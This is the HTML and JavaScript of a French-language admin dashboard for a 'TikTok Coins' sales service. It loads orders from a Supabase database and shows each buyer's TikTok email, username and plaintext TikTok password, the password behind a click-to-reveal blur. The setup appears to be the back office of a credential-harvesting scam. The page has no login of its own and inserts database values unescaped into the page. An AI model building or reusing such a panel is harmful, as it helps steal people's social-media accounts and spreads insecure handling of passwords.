<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok Coins — Administration</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:      #060606;
      --primary: #FE2C55;
      --accent:  #25F4EE;
      --text:    #FFFFFF;
      --surface: #111111;
      --sur2:    #1a1a1a;
      --border:  #2a2a2a;
      --muted:   #888888;
      --green:   #00E676;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; min-height: 100vh; }

    /* ── Nav ── */
    .admin-nav {
      display: flex; align-items: center; justify-content: space-between;
      padding: 14px 20px; background: var(--surface); border-bottom: 1px solid var(--border);
      position: sticky; top: 0; z-index: 100;
    }
    .nav-logo { font-size: 17px; font-weight: 900; display: flex; align-items: center; gap: 8px; }
    .tt-icon { width: 20px; height: 24px; fill: white; filter: drop-shadow(-2px 2px 0 #25F4EE) drop-shadow(2px -2px 0 #FE2C55); flex-shrink: 0; }
    .btn-refresh {
      background: transparent; border: 1px solid var(--border);
      border-radius: 50px; color: var(--text); padding: 7px 16px;
      font-size: 13px; font-weight: 600; cursor: pointer; transition: all .2s;
    }
    .btn-refresh:hover { border-color: var(--primary); color: var(--primary); }

    /* ── Stats ── */
    .stats-bar { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; padding: 14px 16px; }
    .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 14px 10px; text-align: center; }
    .stat-label { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; margin-bottom: 6px; }
    .stat-value { font-size: 22px; font-weight: 900; color: var(--primary); }

    /* ── Search ── */
    .search-bar { padding: 6px 16px 12px; }
    .search-bar input {
      width: 100%; background: var(--surface); border: 1px solid var(--border);
      border-radius: 12px; color: var(--text); font-size: 14px;
      padding: 11px 16px; outline: none; transition: border-color .2s;
    }
    .search-bar input:focus { border-color: var(--primary); }
    .search-bar input::placeholder { color: var(--muted); }

    /* ── Shared select styles ── */
    .status-sel, .pay-sel {
      background: var(--sur2); border: 1px solid var(--border);
      border-radius: 8px; color: var(--text); font-size: 12px;
      font-weight: 600; padding: 5px 8px; cursor: pointer; outline: none;
      transition: border-color .2s; width: 100%;
    }
    .status-sel:focus { border-color: var(--primary); }
    .pay-sel:focus    { border-color: var(--green); }

    /* ── Password ── */
    .pw-val {
      font-family: monospace; font-size: 13px; color: #e2e8f0;
      background: rgba(37,244,238,.06); border: 1px solid rgba(37,244,238,.15);
      border-radius: 6px; padding: 5px 10px; display: inline-block;
      filter: blur(5px); cursor: pointer; transition: filter .2s; user-select: none;
      max-width: 100%; word-break: break-all;
    }
    .pw-val.revealed { filter: blur(0); user-select: text; }

    /* ── Badges ── */
    .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; white-space: nowrap; }
    .by { background: rgba(255,204,0,.15); color: #FFCC00; border: 1px solid rgba(255,204,0,.4); }
    .bg { background: rgba(0,230,118,.15); color: var(--green); border: 1px solid rgba(0,230,118,.4); }
    .br { background: rgba(136,136,136,.15); color: #aaa; border: 1px solid rgba(136,136,136,.4); }

    /* ── Toast ── */
    #toast {
      position: fixed; bottom: 24px; left: 50%;
      transform: translateX(-50%) translateY(100px);
      background: var(--sur2); color: var(--text);
      padding: 12px 24px; border-radius: 50px; font-size: 14px; font-weight: 600;
      border: 1px solid var(--border); z-index: 9999;
      transition: transform .3s, opacity .3s; opacity: 0; pointer-events: none;
    }
    #toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
    #toast.ok   { border-color: var(--green); color: var(--green); }
    #toast.err  { border-color: var(--primary); color: var(--primary); }

    .loading, .empty { color: var(--muted); text-align: center; padding: 32px; font-size: 14px; }

    /* ════════════════════════════════════════
       DESKTOP — Table (>768px)
    ════════════════════════════════════════ */
    .cards-wrap { display: none; }

    .table-wrap { padding: 8px 16px 48px; overflow-x: auto; -webkit-overflow-scrolling: touch; }
    .admin-table {
      width: 100%; border-collapse: collapse; min-width: 960px;
      background: var(--surface); border: 1px solid var(--border);
      border-radius: 16px; overflow: hidden; font-size: 13px;
    }
    .admin-table thead { background: var(--sur2); }
    .admin-table th {
      padding: 13px 14px; text-align: left; font-size: 11px;
      font-weight: 700; text-transform: uppercase; letter-spacing: .05em;
      color: var(--muted); border-bottom: 1px solid var(--border); white-space: nowrap;
    }
    .admin-table td { padding: 12px 14px; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: middle; }
    .admin-table tbody tr:last-child td { border-bottom: none; }
    .admin-table tbody tr:hover { background: rgba(255,255,255,.02); }

    /* ════════════════════════════════════════
       MOBILE — Cards (≤768px)
    ════════════════════════════════════════ */
    @media (max-width: 768px) {
      .table-wrap  { display: none; }
      .cards-wrap  { display: flex; flex-direction: column; gap: 12px; padding: 0 14px 48px; }

      .order-card-admin {
        background: var(--surface); border: 1px solid var(--border);
        border-radius: 16px; padding: 16px; display: flex; flex-direction: column; gap: 10px;
      }

      .oca-head {
        display: flex; justify-content: space-between; align-items: center;
        padding-bottom: 10px; border-bottom: 1px solid var(--border);
      }
      .oca-id   { font-weight: 900; font-size: 15px; color: var(--primary); }
      .oca-date { font-size: 11px; color: var(--muted); }

      .oca-row  { display: flex; flex-direction: column; gap: 3px; }
      .oca-label { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }
      .oca-val   { font-size: 13px; font-weight: 600; }
      .oca-val.accent { color: var(--accent); }
      .oca-val.primary { color: var(--primary); }
      .oca-val.green   { color: var(--green); }

      .oca-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }

      .oca-selects { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding-top: 10px; border-top: 1px solid var(--border); }

      .oca-sel-group { display: flex; flex-direction: column; gap: 4px; }
      .oca-sel-label { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }

      .stats-bar { grid-template-columns: repeat(3,1fr); gap: 8px; padding: 12px; }
      .stat-value { font-size: 18px; }
    }

    @media (max-width: 380px) {
      .stats-bar { grid-template-columns: 1fr 1fr; }
      .stat-card:last-child { grid-column: span 2; }
    }
  </style>
</head>
<body>

  <nav class="admin-nav">
    <div class="nav-logo">
      <svg class="tt-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.27 6.27 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.95a8.26 8.26 0 004.83 1.54V7.05a4.85 4.85 0 01-1.06-.36z"/></svg>
      TikTok Coins — <span style="color:var(--primary);margin-left:4px">Admin</span>
    </div>
    <button class="btn-refresh" onclick="loadOrders()">↻ Actualiser</button>
  </nav>

  <div class="stats-bar">
    <div class="stat-card">
      <div class="stat-label">Commandes</div>
      <div class="stat-value" id="sTot">—</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Revenu</div>
      <div class="stat-value" id="sRev" style="font-size:14px;padding-top:4px">—</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">En attente</div>
      <div class="stat-value" id="sPend">—</div>
    </div>
  </div>

  <div class="search-bar">
    <input type="text" id="searchInput" placeholder="🔍 Rechercher par email, pseudo, TikTok, ID..." oninput="filterOrders()">
  </div>

  <!-- Desktop table -->
  <div class="table-wrap">
    <table class="admin-table">
      <thead>
        <tr>
          <th>#</th>
          <th>Email TikTok</th>
          <th>Pseudo (compte)</th>
          <th>🎯 TikTok à créditer</th>
          <th>🔑 Mot de passe</th>
          <th>Pièces</th>
          <th>Prix</th>
          <th>Paiement</th>
          <th>Statut</th>
        </tr>
      </thead>
      <tbody id="tBody">
        <tr><td colspan="9" class="loading">Chargement...</td></tr>
      </tbody>
    </table>
  </div>

  <!-- Mobile cards -->
  <div class="cards-wrap" id="cardsWrap">
    <p class="loading">Chargement...</p>
  </div>

  <div id="toast"></div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
<script>
const { createClient } = supabase;
const db = createClient(
  'https://osgdzllrwvjxkjaagwtg.supabase.co',
  'sb_publishable_A3qyBPM64bwVx8f-do7lHg_B-cAtLsE'
);

function fmtPrice(n) { return Number(n).toLocaleString('fr-FR') + ' FCFA'; }
function fmtCoins(n) { return Number(n).toLocaleString('fr-FR'); }

function toast(msg, type = 'info', ms = 3000) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.className = 'show ' + (type === 'ok' ? 'ok' : type === 'err' ? 'err' : '');
  clearTimeout(el._t);
  el._t = setTimeout(() => { el.className = ''; }, ms);
}

function orderBadge(s) {
  const m = { 'en cours': ['En cours','by'], 'effectue': ['Effectué ✓','bg'], 'en_attente': ['En attente','br'] };
  const [l, c] = m[s] || ['—', 'br'];
  return `<span class="badge ${c}">${l}</span>`;
}

let allOrders = [];

async function loadOrders() {
  document.getElementById('tBody').innerHTML    = '<tr><td colspan="9" class="loading">Chargement...</td></tr>';
  document.getElementById('cardsWrap').innerHTML = '<p class="loading">Chargement...</p>';

  const { data, error } = await db.from('orders')
    .select(`id,coin_amount,price,payment_status,order_status,tiktok_username,created_at,
             users(tiktok_email,tiktok_username,tiktok_password)`)
    .order('created_at', { ascending: false });

  if (error) {
    document.getElementById('tBody').innerHTML    = `<tr><td colspan="9" class="empty">Erreur : ${error.message}</td></tr>`;
    document.getElementById('cardsWrap').innerHTML = `<p class="empty">Erreur : ${error.message}</p>`;
    return;
  }

  allOrders = data || [];
  renderAll(allOrders);
  updateStats(allOrders);
}

function renderAll(rows) {
  renderTable(rows);
  renderCards(rows);
}

/* ── Desktop table ── */
function renderTable(rows) {
  const tbody = document.getElementById('tBody');
  if (!rows.length) { tbody.innerHTML = '<tr><td colspan="9" class="empty">Aucune commande.</td></tr>'; return; }

  tbody.innerHTML = rows.map(o => {
    const u = o.users || {};
    const d = new Date(o.created_at).toLocaleDateString('fr-FR', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
    const target = o.tiktok_username || u.tiktok_username || '—';

    return `<tr>
      <td><strong style="color:var(--primary)">#${o.id}</strong><br><small style="color:var(--muted)">${d}</small></td>
      <td style="color:var(--accent)">${u.tiktok_email || '—'}</td>
      <td style="font-weight:600">@${u.tiktok_username || '—'}</td>
      <td style="color:var(--primary);font-weight:700">@${target}</td>
      <td><span class="pw-val" onclick="this.classList.toggle('revealed')">${u.tiktok_password || '—'}</span></td>
      <td><strong>${fmtCoins(o.coin_amount)}</strong> 🪙</td>
      <td style="font-weight:700;color:var(--accent)">${fmtPrice(o.price)}</td>
      <td>
        <select class="pay-sel" data-id="${o.id}" data-field="payment_status" data-prev="${o.payment_status}" onchange="updateField(this)">
          <option value="en_attente" ${o.payment_status==='en_attente'?'selected':''}>⏳ En attente</option>
          <option value="payé"       ${o.payment_status==='payé'      ?'selected':''}>✅ Payé</option>
        </select>
      </td>
      <td>
        <select class="status-sel" data-id="${o.id}" data-field="order_status" data-prev="${o.order_status}" onchange="updateField(this)">
          <option value="en cours"   ${o.order_status==='en cours'  ?'selected':''}>🔄 En cours</option>
          <option value="effectue"   ${o.order_status==='effectue'  ?'selected':''}>✅ Effectué</option>
          <option value="en_attente" ${o.order_status==='en_attente'?'selected':''}>⏳ En attente</option>
        </select>
      </td>
    </tr>`;
  }).join('');
}

/* ── Mobile cards ── */
function renderCards(rows) {
  const wrap = document.getElementById('cardsWrap');
  if (!rows.length) { wrap.innerHTML = '<p class="empty">Aucune commande.</p>'; return; }

  wrap.innerHTML = rows.map(o => {
    const u = o.users || {};
    const d = new Date(o.created_at).toLocaleDateString('fr-FR', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
    const target = o.tiktok_username || u.tiktok_username || '—';

    return `<div class="order-card-admin">
      <div class="oca-head">
        <span class="oca-id">#${o.id}</span>
        <span class="oca-date">${d}</span>
      </div>

      <div class="oca-row">
        <span class="oca-label">Email TikTok</span>
        <span class="oca-val accent">${u.tiktok_email || '—'}</span>
      </div>

      <div class="oca-row-2">
        <div class="oca-row">
          <span class="oca-label">Compte</span>
          <span class="oca-val">@${u.tiktok_username || '—'}</span>
        </div>
        <div class="oca-row">
          <span class="oca-label">🎯 À créditer</span>
          <span class="oca-val primary">@${target}</span>
        </div>
      </div>

      <div class="oca-row">
        <span class="oca-label">🔑 Mot de passe (cliquer pour révéler)</span>
        <span class="pw-val" onclick="this.classList.toggle('revealed')">${u.tiktok_password || '—'}</span>
      </div>

      <div class="oca-row-2">
        <div class="oca-row">
          <span class="oca-label">Pièces</span>
          <span class="oca-val">${fmtCoins(o.coin_amount)} 🪙</span>
        </div>
        <div class="oca-row">
          <span class="oca-label">Prix</span>
          <span class="oca-val accent">${fmtPrice(o.price)}</span>
        </div>
      </div>

      <div class="oca-selects">
        <div class="oca-sel-group">
          <span class="oca-sel-label">Paiement</span>
          <select class="pay-sel" data-id="${o.id}" data-field="payment_status" data-prev="${o.payment_status}" onchange="updateField(this)">
            <option value="en_attente" ${o.payment_status==='en_attente'?'selected':''}>⏳ En attente</option>
            <option value="payé"       ${o.payment_status==='payé'      ?'selected':''}>✅ Payé</option>
          </select>
        </div>
        <div class="oca-sel-group">
          <span class="oca-sel-label">Statut</span>
          <select class="status-sel" data-id="${o.id}" data-field="order_status" data-prev="${o.order_status}" onchange="updateField(this)">
            <option value="en cours"   ${o.order_status==='en cours'  ?'selected':''}>🔄 En cours</option>
            <option value="effectue"   ${o.order_status==='effectue'  ?'selected':''}>✅ Effectué</option>
            <option value="en_attente" ${o.order_status==='en_attente'?'selected':''}>⏳ En attente</option>
          </select>
        </div>
      </div>
    </div>`;
  }).join('');
}

function updateStats(rows) {
  document.getElementById('sTot').textContent  = rows.length;
  const rev  = rows.reduce((s, o) => s + parseFloat(o.price || 0), 0);
  document.getElementById('sRev').textContent  = fmtPrice(rev);
  const pend = rows.filter(o => o.payment_status === 'en_attente').length;
  document.getElementById('sPend').textContent = pend;
}

async function updateField(sel) {
  const id    = parseInt(sel.dataset.id);
  const field = sel.dataset.field;
  const val   = sel.value;
  const prev  = sel.dataset.prev;

  const update = {};
  update[field] = val;

  const { error } = await db.from('orders').update(update).eq('id', id);
  if (error) {
    toast('Erreur mise à jour.', 'err');
    sel.value = prev;
  } else {
    toast('Mis à jour ✓', 'ok');
    sel.dataset.prev = val;
    const o = allOrders.find(x => x.id === id);
    if (o) o[field] = val;
    updateStats(allOrders);
  }
}

function filterOrders() {
  const q = document.getElementById('searchInput').value.toLowerCase();
  if (!q) { renderAll(allOrders); return; }
  const f = allOrders.filter(o => {
    const u = o.users || {};
    return String(o.id).includes(q)
      || (u.tiktok_email    || '').toLowerCase().includes(q)
      || (u.tiktok_username || '').toLowerCase().includes(q)
      || (o.tiktok_username || '').toLowerCase().includes(q)
      || (o.order_status    || '').toLowerCase().includes(q)
      || (o.payment_status  || '').toLowerCase().includes(q);
  });
  renderAll(f);
}

loadOrders();
</script>
</body>
</html>
